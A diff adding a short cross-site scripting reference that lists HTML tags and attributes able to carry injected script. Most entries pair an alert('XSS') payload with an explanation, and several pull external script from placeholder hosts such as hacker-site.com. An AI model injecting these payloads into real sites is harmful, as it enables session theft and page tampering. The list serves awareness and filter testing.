@@ -1,0 +1,44 @@
+<SCRIPT>
+The <SCRIPT> tag is the most popular way and sometimes easiest to detect. It can arrive to your page in the following forms:
+External script:
+<SCRIPT SRC=http://hacker-site.com/xss.js></SCRIPT>
+Embedded script:
+<SCRIPT> alert(“XSS”); </SCRIPT>
+<BODY>
+The <BODY> tag can contain an embedded script by using the ONLOAD event, as shown below:
+<BODY ONLOAD=alert("XSS")>
+The BACKGROUND attribute can be similarly exploited:
+<BODY BACKGROUND="javascript:alert('XSS')">
+<IMG>
+Some browsers will execute a script when found in the <IMG> tag as shown here:
+<IMG SRC="javascript:alert('XSS');">
+There are some variations of this that work in some browsers:
+<IMG DYNSRC="javascript:alert('XSS')">
+<IMG LOWSRC="javascript:alert('XSS')">
+<IFRAME>
+The <IFRAME> tag allows you to import HTML into a page. This important HTML can contain a script.
+<IFRAME SRC=”http://hacker-site.com/xss.html”>
+<INPUT>
+If the TYPE attribute of the <INPUT> tag is set to “IMAGE”, it can be manipulated to embed a script:
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<LINK>
+The <LINK> tag, which is often used to link to external style sheets could contain a script:
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+<TABLE>
+The BACKGROUND attribute of the TABLE tag can be exploited to refer to a script instead of an image:
+<TABLE BACKGROUND="javascript:alert('XSS')">
+The same applies to the <TD> tag, used to separate cells inside a table:
+<TD BACKGROUND="javascript:alert('XSS')">
+<DIV>
+The <DIV> tag, similar to the <TABLE> and <TD> tags can also specify a background and therefore embed a script:
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+The <DIV> STYLE attribute can also be manipulated in the following way:
+<DIV STYLE="width: expression(alert('XSS'));">
+<OBJECT>
+The <OBJECT> tag can be used to pull in a script from an external site in the following way:
+<OBJECT TYPE="text/x-scriptlet" DATA="http://hacker.com/xss.html">
+<EMBED>
+If the hacker places a malicious script inside a flash file, it can be injected in the following way:
+<EMBED SRC="http://hacker.com/xss.swf" AllowScriptAccess="always">
+
+출처 : http://youngsam.kr/1547
